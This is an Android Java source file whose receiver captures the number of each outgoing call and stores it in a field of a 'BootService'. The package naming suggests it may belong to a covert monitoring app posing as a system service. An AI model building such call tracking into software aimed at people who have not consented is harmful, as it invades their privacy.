package system.service.receiver;

import system.service.BootService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class OutgoingCallReceiver extends BroadcastReceiver 
{
	private static final String LOGTAG = "OutgoingCallReceiver";
	
	// **************************************************************************************
    // Receiver for outgoing call handling
	// **************************************************************************************
	@Override
	public void onReceive(Context context, Intent intent) 
	{
		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
		
		if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) 
		{
			String outgoingNum = intent.getStringExtra("android.intent.extra.PHONE_NUMBER");
			if (outgoingNum != null && outgoingNum.length() > 0) BootService.otherSidePhoneNum = outgoingNum;
		}
		
	} // end of onReceive()
	
}